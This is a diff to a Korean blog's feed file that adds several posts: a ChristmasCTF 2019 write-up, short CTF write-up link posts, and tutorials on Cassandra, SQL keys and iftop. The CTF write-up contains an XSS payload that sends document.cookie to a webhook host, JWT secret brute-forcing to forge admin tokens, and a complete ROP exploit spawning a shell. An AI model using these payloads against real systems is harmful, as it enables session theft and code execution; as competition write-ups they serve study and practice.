@@ -4,6 +4,172 @@
   
     
     <entry>
+      <title>ChristmasCTF 2019 Write up</title>
+      <link href="2020/12/26/christmasctf-201226/"/>
+      <url>2020/12/26/christmasctf-201226/</url>
+      
+        <content type="html"><![CDATA[<h3 id="1-Web-watermelon"><a href="#1-Web-watermelon" class="headerlink" title="1. [Web] watermelon"></a>1. [Web] watermelon</h3><p>이 문제는 언인텐 풀이로 푼 것 같다. 문제 내에서 로그인 계정 중</p><p>admin 계정에 대해서</p><p>비밀번호가 admin 과 같이 세팅되어 있음을 알 수 있었고,</p><p>이를 통해 로그인 하여 플래그를 얻어낼 수 있었다.</p><h3 id="2-Web-JWT"><a href="#2-Web-JWT" class="headerlink" title="2. [Web] JWT"></a>2. [Web] JWT</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">jwt: &#123;</span><br><span class="line">    bruth: &#123;</span><br><span class="line">      key: <span class="string">&#x27;********&#x27;</span>, <span class="comment">// 0~9, 8 length</span></span><br><span class="line">      options: &#123;</span><br><span class="line">        issuer: <span class="string">&#x27;c2w2m2&#x27;</span>,</span><br><span class="line">        expiresIn: <span class="string">&#x27;1d&#x27;</span>,</span><br><span class="line">        algorithm: <span class="string">&#x27;HS256&#x27;</span>,</span><br><span class="line">      &#125;</span><br><span class="line"> &#125;;</span><br></pre></td></tr></table></figure><p>해당 문제는 PHP JWT TOKEN 를 사용하는 문제이다.</p><p>config.js 에서 위와 같은 내용을 확인할 수 있었고</p><p>결론적으로 secret key를 브포해서 찾아내야 하는 것이였다.</p><p>그래서 해당 범위 내 숫자로 구성해서 브포를 돌려서 토큰의 secret key를 얻었고,</p><p>payload 부분에 있는 is_admin 항목을 true로 변조한 뒤 다시 인코딩하여 쿠키를 바꿔줌으로써 플래그를 얻었다.</p><ul><li>참고 : john the ripeer(<a href="https://www.openwall.com/john/">https://www.openwall.com/john/</a>)</li></ul><h3 id="3-Web-CSRF"><a href="#3-Web-CSRF" class="headerlink" title="3. [Web] CSRF"></a>3. [Web] CSRF</h3><p>해당 문제는 CSRF(Cross-site-Request-Forgery) 취약점을 사용한 문제이다.</p><p>문제에 보면 게시글을 쓸 수 있는 공간이 있고, 해당 로직을 처리하는 부분의 코드를 분석했을 때 다음과 같은 사실을 알 수 있다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (board.content.match(<span class="regexp">/script|img|on/i</span>)) <span class="keyword">return</span> res.send(&#123; <span class="attr">code</span>: <span class="number">400</span> &#125;);</span><br></pre></td></tr></table></figure><p>무려 내용 작성에 대해서만 필터링을 걸고 제목에는 없다.. 그래서 이를 이용해서 제목에 페이로드를 넣었다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location.href=<span class="string">&#x27;https://webhook.site~&#x27;</span> + <span class="built_in">document</span>.cookie;</span><br></pre></td></tr></table></figure><h3 id="4-Pwn-Solo-test"><a href="#4-Pwn-Solo-test" class="headerlink" title="4. [Pwn] Solo test"></a>4. [Pwn] Solo test</h3><p>ROP 기법을 이용해서 풀면 된다.</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./solo_test&#x27;</span>)</span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./solo_test&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc227.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pr = <span class="number">0x0000000000400b83</span></span><br><span class="line">ret = <span class="number">0x00000000004005f1</span></span><br><span class="line"></span><br><span class="line">puts_plt = e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">solo = e.symbols[<span class="string">&#x27;solo&#x27;</span>]</span><br><span class="line"></span><br><span class="line">puts_offset = libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_offset = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_offset = <span class="built_in">next</span>(libc.search(<span class="string">&quot;/bin/sh&quot;</span>))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;Me&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;No&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;CTF&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;Never&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;No&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">88</span></span><br><span class="line">payload += p64(pr)</span><br><span class="line">payload += p64(puts_got)</span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line">payload += p64(solo)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;--&gt; &#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - puts_offset</span><br><span class="line">system_addr = libc_base + system_offset</span><br><span class="line">binsh_addr = libc_base + binsh_offset</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">88</span></span><br><span class="line">payload += p64(pr)</span><br><span class="line">payload += p64(binsh_addr)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;--&gt; &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Web </tag>
+            
+            <tag> Pwnable </tag>
+            
+            <tag> ChristmasCTF2019 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>BISC CTF 2020(oldschool) write up</title>
+      <link href="2020/11/21/bob-bisc-201129/"/>
+      <url>2020/11/21/bob-bisc-201129/</url>
+      
+        <content type="html"><![CDATA[<p>사실 풀고나니 꽤나 쉬웠던 것 같은 문제인데, 요즘 시스템쪽을 하는둥 마는둥 하다보니 익스코드 짜는데</p><p>오래 걸려버려서 대회 중에는 인증을 못해봤었다.. (틈틈히 챙겨야 할듯)</p><p><a href="https://www.notion.so/jhyeon/BISC-2020-oldschool-write-up-7b4dc57cf9834eab9f1260adf1b609f5">https://www.notion.so/jhyeon/BISC-2020-oldschool-write-up-7b4dc57cf9834eab9f1260adf1b609f5</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> BISC2020 </tag>
+            
+            <tag> Pwnable </tag>
+            
+            <tag> ROP </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>POX(Power of xx) 2020 Write up</title>
+      <link href="2020/11/21/poxctf-201121/"/>
+      <url>2020/11/21/poxctf-201121/</url>
+      
+        <content type="html"><![CDATA[<p>POX 2020 출제자 Write up 자료입니다.</p><p>아래 노션에서 풀이를 확인하실 수 있습니다.</p><p>질문 사항이 있으시면 <a href="mailto:&#115;&#116;&#106;&#104;&#121;&#101;&#111;&#x6e;&#x40;&#107;&#97;&#107;&#97;&#111;&#46;&#99;&#111;&#109;">&#115;&#116;&#106;&#104;&#121;&#101;&#111;&#x6e;&#x40;&#107;&#97;&#107;&#97;&#111;&#46;&#99;&#111;&#109;</a> 으로 메일을 보내주세요!</p><p><a href="https://www.notion.so/jhyeon/POX-2020-Write-Up-300e65d33b6c4dd185d886cd2e7a6417">https://www.notion.so/jhyeon/POX-2020-Write-Up-300e65d33b6c4dd185d886cd2e7a6417</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> POX2020 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>NoSQL - Cassandra Engine</title>
+      <link href="2020/09/25/cassandra-200925/"/>
+      <url>2020/09/25/cassandra-200925/</url>
+      
+        <content type="html"><![CDATA[<h2 id="Cassandra"><a href="#Cassandra" class="headerlink" title="Cassandra"></a>Cassandra</h2><h3 id="Cassandra란"><a href="#Cassandra란" class="headerlink" title="Cassandra란?"></a>Cassandra란?</h3><p>Cassandra(Free-Open Source Distributed NoSQL Database) 는 분산형 오픈소스 NoSQL Database이며,</p><p>단일 장애점(Single Point of Failure, SPOF) 없이 고성능을 제공하며 많은 서버들간에 대용량 데이터를 관리하기 위해 설계되었습니다.</p><p>Cassandra는 여러 데이터 센터(Data Center)에 걸쳐 Cluster를 지원하고 있으며 대용량의 데이터, 구조화, 비정형 데이터를 관리하는데 적합합니다.</p><h3 id="Cassandra의-장점-및-단점"><a href="#Cassandra의-장점-및-단점" class="headerlink" title="Cassandra의 장점 및 단점"></a>Cassandra의 장점 및 단점</h3><p>장점 : Consistent Hashing 구조를 이용한 Ring구조와 Gossip Protocol을 구현하였기 때문에,</p><p>각 노드의 장비추가, 제거 등이 자유롭고 데이터 센터까지 고려할 수 있는 데이터 복제 정책을 사용하고 있어 안정성 측면에서 많은 장점을 가지고 있습니다.</p><p>Cassandra를 이용하면 Sharing, Master-Slave와 같은 정책 없이도 장애 대응이 가능하며 장비를 늘리고 줄이는 것에 큰 비용이 들지 않습니다.</p><p>단점 : Cassandra는 테이블 간 Join이나 Transaction을 지원하지 않고, Index 등의 검색을 위한 기능도 매우 단출하며,</p><p>Cassandra의 구조상 RDBMS와 같은 페이징(Paging)을 구현하는 것이 어렵고 Keyspace, Table을 과도하게 생성할 경우 메모리 오버플로우가 발생할 수 있습니다.</p><h3 id="Cassandra-Data-Structure"><a href="#Cassandra-Data-Structure" class="headerlink" title="Cassandra Data Structure"></a>Cassandra Data Structure</h3><img src="/img/post/cassandra/1.png" class="lazyload placeholder" data-srcset="/img/post/cassandra/1.png" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg"><p>Cassandra의 데이터 구조는 다음 사진과 같습니다.</p><p>Keyspace -&gt; Table -&gt; Row key -&gt; Column(Name, Value)로 구성되어 있습니다.</p><p>이 때 Keyspace와 Table에 대한 정보는 모든 Cassandra Node의 Memory에 저장되며 실제 데이터가 저장되는 Row는 각 Row-key를 가지고,</p><p>Hash(token)을 기준으로 각 노드에 분산 저장되어있습니다. 그리고 Row에 속하는 Column은 Column Name을 기준으로 정렬되어 저장됩니다.</p><h3 id="Cassandra-Column-Super-Column"><a href="#Cassandra-Column-Super-Column" class="headerlink" title="Cassandra Column, Super Column"></a>Cassandra Column, Super Column</h3><p>Cassandra의 컬럼과 슈퍼컬럼 두 컬럼 모두 Name, Value로 이루어진 튜플형입니다.</p><p>이 두 컬럼의 차이점은 문자열(String)과 Map 형태의 차이점입니다.</p><p>즉, 슈퍼컬럼의 값에는 다양한 형태의 데이터 타입을 가질 수 있습니다.</p><h3 id="Cassandra-설치"><a href="#Cassandra-설치" class="headerlink" title="Cassandra 설치"></a>Cassandra 설치</h3><ul><li><a href="https://cassandra.apache.org/download/">https://cassandra.apache.org/download/</a></li></ul><h3 id="Cassandra-예제"><a href="#Cassandra-예제" class="headerlink" title="Cassandra 예제"></a>Cassandra 예제</h3><p>Cassandra CQL Shell에 접속하는 방법은 다음과 같습니다. (Debian/Ubuntu 기준)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cqlsh</span><br></pre></td></tr></table></figure><p>이 때, 사용자 인증을 거치지않고 쉘에 접속하게 되는데 보안 설정을 위해서는 다음과 같이 설정합니다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo vi /etc/cassandra/cassandra.yaml</span><br></pre></td></tr></table></figure><p>(104 Lines) authenticator: PasswordAuthenticator # AllowAllAuthenticator 주석 처리 후 변경</p><p>이후 CQL Shell에 접속하기 위해서는 다음과 같은 명령어로 접속합니다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cqlsh -u cassandra -p cassandra <span class="comment"># 기본 계정</span></span><br></pre></td></tr></table></figure><p>하지만 위와 같은 방법도 기본 계정으로 설정되어 있기 때문에 새로운 유저를 추가해서 사용하는 방식으로 변경합니다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cassandra@cqlsh&gt; create user username with password <span class="string">&#x27;password&#x27;</span> superuser;</span><br><span class="line">cassandra@cqlsh&gt; <span class="built_in">exit</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cqlsh -u username -p password</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cassandra@cqlsh&gt; drop user cassandra;</span><br><span class="line">cassandra@cqlsh&gt; LIST USERS; /* 생성된 계정 확인 */</span><br></pre></td></tr></table></figure><p>이제 Cassandra에 대한 기본적인 보안을 거쳐 사용하실 수 있습니다!</p><h3 id="새로운-Keyspace-생성"><a href="#새로운-Keyspace-생성" class="headerlink" title="새로운 Keyspace 생성"></a>새로운 Keyspace 생성</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username@cqlsh&gt; create keyspace keyspace_name with replication = &#123;&#x27;class&#x27;: &#x27;SimpleStrategy&#x27;, &#x27;replication_factor&#x27;: 3&#125;;</span><br><span class="line">username<span class="variable">@cqlsh</span><span class="operator">&gt;</span> <span class="keyword">desc</span> keyspaces; <span class="comment">/* 생성된 keyspace 확인 */</span></span><br></pre></td></tr></table></figure><p>Replication이란 Keyspace를 생성할때 Replication의 복제 개수, 위치를 결정할 수 있는데 옵션은 아래와 같습니다.</p><p>SimpleStrategy 옵션은 단일 데이터 센터일 경우 사용하는 옵션이며,</p><p>멀티 데이터 센터를 사용할 경우 NetworkTopologyStrategy 를 사용하면 됩니다.</p><p>또, replication_factor란 동일한 데이터의 사본(복사본)을 수신할 클러스터의 시스템 수를 의미합니다.</p><h3 id="새로운-Table-생성"><a href="#새로운-Table-생성" class="headerlink" title="새로운 Table 생성"></a>새로운 Table 생성</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username<span class="variable">@cqlsh</span><span class="operator">&gt;</span> use keyspace_name; <span class="comment">/* 이전에 만든 keyspace로 접속 */</span></span><br><span class="line">username<span class="variable">@cqlsh</span>:keyspace_name<span class="operator">&gt;</span> <span class="keyword">create</span> <span class="keyword">table</span> test.test_table(idx <span class="type">int</span>, name text, context text); <span class="comment">/* 테이블 생성 */</span></span><br><span class="line">username<span class="variable">@cqlsh</span>:keyspace_name<span class="operator">&gt;</span> <span class="keyword">desc</span> test.test_table;</span><br></pre></td></tr></table></figure><h3 id="생성한-Table에-데이터-삽입"><a href="#생성한-Table에-데이터-삽입" class="headerlink" title="생성한 Table에 데이터 삽입"></a>생성한 Table에 데이터 삽입</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username<span class="variable">@cqlsh</span>:keyspace_name<span class="operator">&gt;</span> <span class="keyword">insert</span> <span class="keyword">into</span> test.test_table (idx, name, context) <span class="keyword">values</span> (<span class="number">1</span>, <span class="string">&#x27;bob&#x27;</span>, <span class="string">&#x27;bobgood&#x27;</span>); <span class="comment">/* 데이터 삽입 */</span></span><br><span class="line">username<span class="variable">@cqlsh</span>:keyspace_name<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test.test_table; <span class="comment">/* 테이블의 모든 행 조회 */</span></span><br></pre></td></tr></table></figure><h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><ul><li><p><a href="https://meetup.toast.com/search?searchText=Cassandra">https://meetup.toast.com/search?searchText=Cassandra</a></p></li><li><p><a href="http://www.incodom.kr/Cassandra_%EC%A0%95%EC%9D%98">http://www.incodom.kr/Cassandra_%EC%A0%95%EC%9D%98</a></p></li><li><p><a href="https://newly0513.tistory.com/37">https://newly0513.tistory.com/37</a></p></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> Docx </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> NoSQL </tag>
+            
+            <tag> Cassandra </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>DB Primary Key, Foreign Key</title>
+      <link href="2020/09/24/db-key-200924/"/>
+      <url>2020/09/24/db-key-200924/</url>
+      
+        <content type="html"><![CDATA[<h3 id="SQL-제약조건"><a href="#SQL-제약조건" class="headerlink" title="SQL 제약조건"></a>SQL 제약조건</h3><ol><li>Not Null</li></ol><ul><li>데이터에 Null 값이 들어갈 수 없다.</li></ul><ol start="2"><li>Unique</li></ol><ul><li>데이터에 중복되는 값이 들어갈 수 없다.</li></ul><ol start="3"><li>Primary Key(PK)</li></ol><ul><li>각 행 또는 레코드를 고유하게 식별하는 값 (1+2 제약조건 포함)</li></ul><ol start="4"><li>Foreign Key(FK)</li></ol><ul><li>다른 테이블의 레코드를 참조하여 무결성을 검사한다.</li></ul><ol start="5"><li>Check</li></ol><ul><li>데이터의 범위 또는 사용자 조건을 지정한다.</li></ul><h3 id="PK-Primary-Key-란"><a href="#PK-Primary-Key-란" class="headerlink" title="PK(Primary Key)란?"></a>PK(Primary Key)란?</h3><p>데이터베이스 테이블에서 각 행 또는 레코드를 고유하게 식별하는 테이블의 필드를 의미합니다.</p><p>기본 키(PK)는 반드시 고유한 값을 가지며, 기본 키로 설정된 열은 NULL(빈 값)을 가질 수 없습니다.</p><p>또, 하나의 테이블에는 반드시 하나의 기본 키(PK)만을 구성할 수 있습니다.</p><p>(추가) 중복 항목이 입력되지 않기 위해서 PK를 사용하는데 제약조건으로는 여러 개를 추가할 수 없지만,</p><p>테이블을 만들 때 다중 PK를 지정하게 되면 생성이 가능하고 지정한 모든 PK 컬럼에는 중복 데이터가 들어갈 수 없습니다.</p><h3 id="PK-Primary-Key-생성-예제"><a href="#PK-Primary-Key-생성-예제" class="headerlink" title="PK(Primary Key) 생성 예제"></a>PK(Primary Key) 생성 예제</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> test(</span><br><span class="line">    userid <span class="type">varchar</span>(<span class="number">25</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">    username <span class="type">varchar</span>(<span class="number">5</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">    age <span class="type">int</span>(<span class="number">3</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">    <span class="keyword">primary</span> <span class="keyword">key</span>(userid)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> test(</span><br><span class="line">    userid <span class="type">varchar</span>(<span class="number">25</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">    username <span class="type">varchar</span>(<span class="number">5</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">    age <span class="type">int</span>(<span class="number">3</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">    <span class="keyword">primary</span> <span class="keyword">key</span>(userid, username)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>다음과 같이 test 테이블을 생성하고 userid의 속성을 기본 키(PK)로 지정하기 위한 예제입니다.</p><p>이 때, PK로 지정하고자 하는 컬럼은 반드시 “not null”의 제약조건을 가지고 있어야합니다.</p><p>(추가) 2번째 예시는 다중 복합키로 테이블을 구성할 떄의 예시입니다.</p><h3 id="FK-Foreign-Key-란"><a href="#FK-Foreign-Key-란" class="headerlink" title="FK(Foreign Key)란?"></a>FK(Foreign Key)란?</h3><p>테이블의 특정 행 또는 레코드를 서로 연결시켜주는 것을 외래키(Foreign Key)라고 부르고,</p><p>RDBMS(Relation Database Management System)에서 명시적으로 테이블을 연결해주는 장치를 의미합니다.</p><p>예를 들어서 사용자로부터 주문을 받고 처리하기까지의 과정이 있다고 가정하면,</p><p>고객 정보를 저장하는 테이블, 주문을 처리하는 테이블 두개로 나누어서 보자.</p><p>그럼 고객이 특정 상품에 대해서 주문을 했을 때 주문을 처리하는 테이블로 고객의 정보와 함께 어떤 상품인지에 대한 정보가 기록될 것 이고,</p><p>여기서 주문을 한 사용자 정보를 고객 테이블에서 외래키로 참조하여 가져온다면 주문 테이블에 있는 고객들은,</p><p>실제 고객 정보 테이블에 존재하는 사용자라고 볼 수 있으며 무결성이 검증된다는 의미이다.</p><h3 id="FK-Foreign-Key-생성-예제"><a href="#FK-Foreign-Key-생성-예제" class="headerlink" title="FK(Foreign Key) 생성 예제"></a>FK(Foreign Key) 생성 예제</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> Customer_TB(</span><br><span class="line">id <span class="type">varchar</span>(<span class="number">25</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">name <span class="type">varchar</span>(<span class="number">5</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">age <span class="type">int</span>(<span class="number">3</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">phone <span class="type">varchar</span>(<span class="number">15</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">address <span class="type">varchar</span>(<span class="number">20</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line"><span class="keyword">primary</span> <span class="keyword">key</span>(id)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> Order_TB(</span><br><span class="line">order_num <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">not</span> <span class="keyword">null</span> auto_increment,</span><br><span class="line">customer_id <span class="type">varchar</span>(<span class="number">25</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">order_date datetime <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">order_amount <span class="type">int</span>(<span class="number">4</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line"><span class="keyword">primary</span> <span class="keyword">key</span>(order_num),</span><br><span class="line"><span class="keyword">foreign</span> <span class="keyword">key</span>(customer_id) <span class="keyword">references</span> Customer_TB(id) <span class="keyword">ON</span> <span class="keyword">UPDATE</span> CASCADE <span class="keyword">ON</span> <span class="keyword">DELETE</span> CASCADE</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>두 예졔를 보면 위에서 간단한 예시로 설명을 했듯이 똑같이 SQL 구문으로 작성한 것이다.</p><p>여기서 ON UPDATE, ON DELETE 라는 옵션이 있는데 해당 옵션은 외래키(Foreign Key)의 제약조건에 의해</p><p>참조되는 테이블에서 수정, 삭제가 일어날 때 참조하고 있는 테이블도 시스템에서 자동으로 데이터에 대한 수정, 삭제를 수행함을 의미합니다.</p><ol><li><p>CASCADE : 참조되는 테이블에서 데이터를 삭제하거나 수정하면, 참조하는 테이블에서도 삭제와 수정이 같이 이루어집니다.</p></li><li><p>SET NULL : 참조되는 테이블에서 데이터를 삭제하거나 수정하면, 참조하는 테이블의 데이터는 NULL로 변경됩니다.</p></li><li><p>NO ACTION : 참조되는 테이블에서 데이터를 삭제하거나 수정해도, 참조하는 테이블의 데이터는 변경되지 않습니다.</p></li><li><p>SET DEFAULT : 참조되는 테이블에서 데이터를 삭제하거나 수정하면, 참조하는 테이블의 데이터는 필드의 기본값으로 설정됩니다.</p></li><li><p>RESTRICT : 참조하는 테이블에 데이터가 남아 있으면, 참조되는 테이블의 데이터를 삭제하거나 수정할 수 없습니다.</p></li></ol><h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><ul><li><a href="http://www.tcpschool.com/mysql/mysql_constraint_foreignKey">http://www.tcpschool.com/mysql/mysql_constraint_foreignKey</a></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> Docx </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> DB </tag>
+            
+            <tag> Primary Key </tag>
+            
+            <tag> Foreign Key </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Linux[iftop] Example</title>
+      <link href="2020/09/17/linux-iftop-200917/"/>
+      <url>2020/09/17/linux-iftop-200917/</url>
+      
+        <content type="html"><![CDATA[<h3 id="Install"><a href="#Install" class="headerlink" title="Install"></a>Install</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install libpcap-dev</span><br><span class="line">$ sudo apt-get install iftop</span><br></pre></td></tr></table></figure><h3 id="Command"><a href="#Command" class="headerlink" title="Command"></a>Command</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo iftop <span class="comment"># 라이브로 모니터링 하기 때문에 root 권한이 필요하다.</span></span><br></pre></td></tr></table></figure><p>별도의 옵션 없이 실행했을때는 네트워크의 최상단 인터페이스를 기준으로 실시간 모니터링을 수행한다.</p><p>첫번째 라인은 서버의 호스트, 두번째 라인은 대상 호스트 네임(IP 주소), 세번째 라인은 패킷의 전송량을 표시해준다.</p><p>또한 하단의 TX, RX, TOTAL 정보들은 각각 전송량, 수신량, 총 송/수신량을 의미한다.</p><p>그리고 -f(filter) 옵션을 통해 특정 조건에 해당하는 네트워크 패킷만을 보여주는 옵션이 있다.</p><p>pcap-filter 형식의 문자열로 보면되고, 필터 옵션들은 다음과 같다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ man pcap-filter</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo iftop -f <span class="string">&quot;src host 127.0.0.1&quot;</span></span><br><span class="line">$ sudo iftop -f <span class="string">&quot;dst host 8.8.8.8&quot;</span></span><br></pre></td></tr></table></figure><p>주로 사용될만한 것들을 정리하면 다음과 같다.</p><p>자세한 것은 manpage에 보면 상세히 나와있다!</p><h3 